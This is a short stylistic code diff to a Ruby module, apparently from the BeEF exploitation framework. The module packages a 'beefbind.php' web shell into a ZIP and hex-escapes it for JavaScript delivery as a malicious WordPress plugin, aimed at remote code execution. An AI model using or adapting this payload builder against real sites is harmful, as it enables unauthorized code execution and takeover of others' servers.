@@ -19,23 +19,23 @@ class Wordpress_upload_rce_plugin < WordPressCommand
   # This allows easy modification of the beefbind.php to suit the needs, as well as being automatically generated
   # even when the module is used with automated rules
   def self.generate_zip_payload(auth_key)
-    stringio = Zip::OutputStream::write_buffer do |zio|
-      zio.put_next_entry("beefbind.php")
-      
+    stringio = Zip::OutputStream.write_buffer do |zio|
+      zio.put_next_entry('beefbind.php')
+
       file_content = File.read(File.join(File.dirname(__FILE__), 'beefbind.php')).to_s
       file_content.gsub!(/#SHA1HASH#/, Digest::SHA1.hexdigest(auth_key))
-      
+
       zio.write(file_content)
     end
 
     stringio.rewind
-    
+
     payload         = stringio.sysread
     escaped_payload = ''
 
     # Escape payload to be able to put it in the JS
     payload.each_byte do |byte|
-      escaped_payload << "\\" + ("x%02X" % byte)
+      escaped_payload << ("\\#{'x%02X' % byte}")
     end
 
     escaped_payload
